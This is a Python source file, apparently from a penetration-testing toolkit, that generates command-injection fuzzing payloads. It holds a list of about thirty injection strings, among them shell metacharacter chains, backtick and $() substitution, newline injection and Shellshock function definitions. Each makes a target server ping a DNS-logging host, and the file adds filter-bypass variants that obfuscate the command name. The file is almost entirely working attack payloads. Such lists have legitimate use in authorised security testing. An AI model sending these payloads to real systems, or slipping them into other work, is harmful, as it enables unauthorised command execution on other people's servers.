#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019/3/4 下午10:02
# @Author  : Komi
# @File    : rce_payloads.py
# 命令注入Fuzz payload

import urllib

class FuzzPayload(object):
    def __init__(self, flag, dnslog, urlEncode=False):
        self.flag = flag
        self.urlEncode = urlEncode # 是否需要URL编码
        self.dnslog = "."+dnslog
        self.payload_list = ['{ping,-c,2,RANDOM_KEY}','`{ping,-c,2,RANDOM_KEY}`','$(`{ping,-c,2,RANDOM_KEY}`)'
                ';ping -c 2 RANDOM_KEY;','p|ping -c 2 RANDOM_KEY&','p|ping -c 2 RANDOM_KEY',
                '`p|ping -c 2 RANDOM_KEY`','p\'"`0&ping -c 2 RANDOM_KEY&`\'',
                '1\'"`0&ping -c 2 RANDOM_KEY&`\'','p&ping -c 2 RANDOM_KEY&\'\\"`0&ping -c 2 RANDOM_KEY&`\'',
                'p&ping -c 2 RANDOM_KEY&\'\\"`0&',';ping -c 2 RANDOM_KEY&','|ping -c 2 RANDOM_KEY|',
                ';ping -c 2 RANDOM_KEY|',';ping -c 2 RANDOM_KEY\n','a);ping -c 2 RANDOM_KEY;',
                '%0Aping -c 2 RANDOM_KEY%0A','() { :;}; /bin/bash -c "ping -c 2 RANDOM_KEY"',
                '() { :;}; ping -c 2 RANDOM_KEY','&& ping RANDOM_KEY',';ping RANDOM_KEY;//',
                ';$(`ping -c 2 RANDOM_KEY`)','system(\'ping -c 2 RANDOM_KEY\')','";ping -c 2 RANDOM_KEY',
                '"|ping -c 2 RANDOM_KEY','\'; ping -c 2 RANDOM_KEY','$(ping -c RANDOM_KEY)'
                ]

        # bypass
        # https://xz.aliyun.com/t/3918
        # https://blog.csdn.net/Fly_hps/article/details/79946624
        # self.ping_bypass = ['p\in\g','pi$2ng','/???/p?ng','pin${9}g','p\'i\'n\'g\'','ping$IFS$IFS$IFS']

        self.ping_bypass = ['p$p\in${9}g']

    # normal payloads
    def get_normal(self):
        normalPayloadsList = []
        KEY = self.flag+self.dnslog

        for p in self.payload_list:
            np = p.replace("RANDOM_KEY", KEY)
            if self.urlEncode:
                normalPayloadsList.append(urllib.quote(np))
            else:
                normalPayloadsList.append(np)

        return normalPayloadsList

    # some bypass
    def get_bypass(self):
        bypassPayloadList = []
        KEY = self.flag + self.dnslog
        for p in self.payload_list:
            tmp = p.replace("RANDOM_KEY", KEY)
            np = tmp.replace('ping', self.ping_bypass[0])
            if self.urlEncode:
                bypassPayloadList.append(urllib.quote(np))
            else:
                bypassPayloadList.append(np)

        return bypassPayloadList

if __name__ == "__main__":
    fuz_p = FuzzPayload(flag='struts', dnslog='x.dnslog.cc', urlEncode=False)
    print ("【*】some normal payloads\n")
    print (fuz_p.get_normal())
    print ("【*】some bypass payloads\n")
    print (fuz_p.get_bypass())
